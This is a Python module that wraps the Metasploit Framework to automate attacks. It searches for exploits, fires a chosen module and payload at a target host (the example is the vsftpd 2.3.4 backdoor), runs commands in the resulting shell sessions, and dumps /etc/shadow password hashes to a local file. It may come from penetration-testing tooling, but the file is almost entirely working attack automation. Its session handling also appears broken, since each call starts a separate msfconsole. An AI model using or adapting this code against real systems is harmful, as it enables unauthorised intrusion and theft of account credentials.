"""
Metasploit Service - Integration with Metasploit Framework
"""

import subprocess
import asyncio
import re
import os
import tempfile
from typing import Dict, List, Optional


class MetasploitService:
    """Service for interacting with Metasploit Framework"""
    
    def __init__(self):
        self.resource_file = None
        self.sessions = {}
    
    async def search_exploits(self, query: str) -> List[Dict]:
        """
        Search for exploits in Metasploit
        
        Args:
            query: Search term (e.g., "vsftpd")
        
        Returns:
            List of matching exploits
        """
        try:
            cmd = ["msfconsole", "-q", "-x", f"search {query}; exit"]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                error_msg = stderr.decode() if stderr else "Unknown error"
                raise Exception(f"Metasploit search failed: {error_msg}")
            
            output = stdout.decode()
            exploits = self._parse_search_output(output)
            
            return exploits
            
        except FileNotFoundError:
            raise Exception("msfconsole command not found. Please install metasploit-framework.")
        except Exception as e:
            raise Exception(f"Metasploit search failed: {str(e)}")
    
    async def exploit(self, exploit_name: str, rhosts: str, rport: int = 21, payload: str = "cmd/unix/interact") -> Dict:
        """
        Execute Metasploit exploit
        
        Args:
            exploit_name: Name of the exploit module (e.g., "unix/ftp/vsftpd_234_backdoor")
            rhosts: Target host IP address
            rport: Target port
            payload: Payload to use
        
        Returns:
            Exploitation result with session information
        """
        try:
            # Create resource file for msfconsole
            resource_content = f"""
use {exploit_name}
set RHOSTS {rhosts}
set RPORT {rport}
set PAYLOAD {payload}
exploit
"""
            
            # Write to temporary file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(resource_content)
                resource_file = f.name
            
            # Execute msfconsole with resource file
            cmd = ["msfconsole", "-q", "-r", resource_file]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                stdin=asyncio.subprocess.PIPE
            )
            
            # Wait a bit for exploit to complete
            await asyncio.sleep(5)
            
            # Check if process is still running
            if process.returncode is None:
                # Try to get output
                try:
                    stdout, stderr = await asyncio.wait_for(
                        process.communicate(),
                        timeout=10
                    )
                except asyncio.TimeoutError:
                    process.kill()
                    stdout, stderr = await process.communicate()
            else:
                stdout, stderr = await process.communicate()
            
            output = stdout.decode() if stdout else ""
            error_output = stderr.decode() if stderr else ""
            
            # Clean up resource file
            try:
                os.unlink(resource_file)
            except:
                pass
            
            # Check for session creation
            session_id = self._extract_session_id(output)
            
            return {
                "success": session_id is not None,
                "session_id": session_id,
                "output": output,
                "error": error_output
            }
            
        except Exception as e:
            raise Exception(f"Metasploit exploit failed: {str(e)}")
    
    async def list_sessions(self) -> List[Dict]:
        """List active Metasploit sessions"""
        try:
            cmd = ["msfconsole", "-q", "-x", "sessions -l; exit"]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            output = stdout.decode()
            sessions = self._parse_sessions_output(output)
            
            return sessions
            
        except Exception as e:
            raise Exception(f"Failed to list sessions: {str(e)}")
    
    async def execute_command(self, session_id: str, command: str) -> str:
        """
        Execute command in Metasploit session
        
        Args:
            session_id: Session ID
            command: Command to execute
        
        Returns:
            Command output
        """
        try:
            resource_content = f"""
sessions -i {session_id}
{command}
"""
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(resource_content)
                resource_file = f.name
            
            cmd = ["msfconsole", "-q", "-r", resource_file]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            output = stdout.decode() if stdout else ""
            
            # Clean up
            try:
                os.unlink(resource_file)
            except:
                pass
            
            return output
            
        except Exception as e:
            raise Exception(f"Command execution failed: {str(e)}")
    
    async def extract_shadow_hashes(self, session_id: str, shadow_path: str = "/etc/shadow") -> Dict:
        """
        Extract password hashes from shadow file
        
        Args:
            session_id: Metasploit session ID
            shadow_path: Path to shadow file
        
        Returns:
            Dictionary with extracted hashes
        """
        try:
            # Read shadow file
            cat_command = f"cat {shadow_path}"
            output = await self.execute_command(session_id, cat_command)
            
            # Extract hashes (lines with $id$hash format)
            hash_pattern = re.compile(r'^([^:]+):(\$[0-9a-zA-Z$./]+):')
            hashes = []
            
            for line in output.split('\n'):
                match = hash_pattern.match(line)
                if match:
                    username = match.group(1)
                    hash_value = match.group(2)
                    hashes.append({
                        "username": username,
                        "hash": hash_value
                    })
            
            # Save to file
            hash_file = "hashes.txt"
            with open(hash_file, 'w') as f:
                for item in hashes:
                    f.write(f"{item['username']}:{item['hash']}\n")
            
            return {
                "success": True,
                "hashes": hashes,
                "count": len(hashes),
                "file": hash_file
            }
            
        except Exception as e:
            raise Exception(f"Hash extraction failed: {str(e)}")
    
    def _parse_search_output(self, output: str) -> List[Dict]:
        """Parse Metasploit search output"""
        exploits = []
        lines = output.split('\n')
        
        for line in lines:
            if 'exploit/' in line or 'auxiliary/' in line:
                parts = line.split()
                if len(parts) >= 2:
                    exploits.append({
                        "name": parts[0],
                        "rank": parts[1] if len(parts) > 1 else "normal",
                        "description": " ".join(parts[2:]) if len(parts) > 2 else ""
                    })
        
        return exploits
    
    def _extract_session_id(self, output: str) -> Optional[str]:
        """Extract session ID from Metasploit output"""
        # Look for "Command shell session X opened" pattern
        pattern = r'Command shell session (\d+) opened'
        match = re.search(pattern, output)
        if match:
            return match.group(1)
        
        # Alternative pattern
        pattern = r'Session (\d+) created'
        match = re.search(pattern, output)
        if match:
            return match.group(1)
        
        return None
    
    def _parse_sessions_output(self, output: str) -> List[Dict]:
        """Parse sessions list output"""
        sessions = []
        lines = output.split('\n')
        
        for line in lines:
            if re.match(r'^\s*\d+\s+', line):
                parts = line.split()
                if len(parts) >= 3:
                    sessions.append({
                        "id": parts[0],
                        "type": parts[1],
                        "info": " ".join(parts[2:])
                    })
        
        return sessions

